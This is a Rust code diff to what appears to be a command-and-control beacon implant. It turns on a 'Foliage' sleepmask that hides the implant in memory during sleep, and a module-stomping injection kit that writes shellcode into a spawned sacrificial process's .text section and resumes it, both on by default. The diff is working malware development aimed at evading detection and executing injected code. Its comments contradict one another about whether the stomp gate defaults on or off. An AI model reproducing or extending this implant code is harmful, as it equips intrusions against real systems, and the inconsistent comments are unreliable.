@@ -46,9 +46,20 @@ impl SleepmaskKit for NoMask {
     }
 }
 
-/// The active sleepmask kit. Swap `NoMask` for an encrypting impl (Ekko/Foliage)
-/// in P2; nothing else in the beacon loop changes.
-const SLEEPMASK_KIT: NoMask = NoMask;
+/// Foliage sleepmask kit: delegates to [`crate::sleep`] which runs the gated
+/// Foliage executor. When [`crate::sleep::foliage_enabled`] is ON (default),
+/// `sleep()` runs the Foliage APC chain; when manually disabled it falls
+/// through to `NoMask` → identical behavior.
+pub struct Foliage;
+impl SleepmaskKit for Foliage {
+    fn sleep_masked(&self, seconds: u32) {
+        crate::sleep::sleep(seconds);
+    }
+}
+
+/// The active sleepmask kit. Foliage masks the image at sleep when armed
+/// (ON by default via `foliage_enabled`); if disabled, it's NoMask-equivalent.
+const SLEEPMASK_KIT: Foliage = Foliage;
 
 /// Beacon-facing sleep entry. Routes through the configured kit so a future
 /// encrypting impl is a one-line kit swap, not a loop edit.
@@ -75,16 +86,35 @@ pub trait ProcessInjectKit {
     }
 }
 
-/// Default process-inject kit: no technique yet. Module stomping lands in P2.
-pub struct NotImpl;
-impl ProcessInjectKit for NotImpl {}
+/// Default process-inject kit: delegates to `crate::inject::module_stomp`
+/// (P2.1c). The stomp+resume tail there is gated (`inject::modulestomp_enabled`,
+/// default **ON**), so by default this runs the full module-stomping path —
+/// spawn a suspended sacrificial process, stomp a module's `.text` with the
+/// shellcode, and resume. The operator can disarm via
+/// `set_modulestomp_enabled(false)` if the target requires a no-cross-process
+/// footprint, in which case only the suspended sacrificial process handle is
+/// returned (no shellcode executed). Kept as a `ProcessInjectKit` impl so the
+/// postex `inject()` entry routes through the real data path (CreateProcessW)
+/// and the SDK `ModuleStomper` impl stays the single source for the algorithm.
+pub struct ModuleStompKit;
+impl ProcessInjectKit for ModuleStompKit {
+    fn inject(&self, spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
+        // SAFETY: single-threaded beacon context. With the stomp gate ON
+        // (default) this only creates a suspended process — no shellcode runs.
+        let h = unsafe { crate::inject::module_stomp(spawn_to, shellcode).ok()? };
+        Some(InjectedHandle(h))
+    }
+}
 
 /// The active process-inject kit.
-const PROCESS_INJECT_KIT: NotImpl = NotImpl;
+const PROCESS_INJECT_KIT: ModuleStompKit = ModuleStompKit;
 
-/// Postex-facing injection entry. Returns `None` today (NotImpl); a real kit
-/// makes spawn-to + execute-in-sacrificial-process available to postex without
-/// a postex rewrite.
+/// Postex-facing injection entry. Routes through the active kit
+/// (`ModuleStompKit` → `crate::inject::module_stomp`). Returns `None` if
+/// CreateProcessW fails (spawn_to missing / blocked); returns a handle to a
+/// SUSPENDED sacrificial process otherwise. The actual .text stomp + resume
+/// runs only when `inject::modulestomp_enabled` is armed (default OFF) — until
+/// then this is the safe data path (no cross-process write/execute).
 pub fn inject(spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
     PROCESS_INJECT_KIT.inject(spawn_to, shellcode)
 }
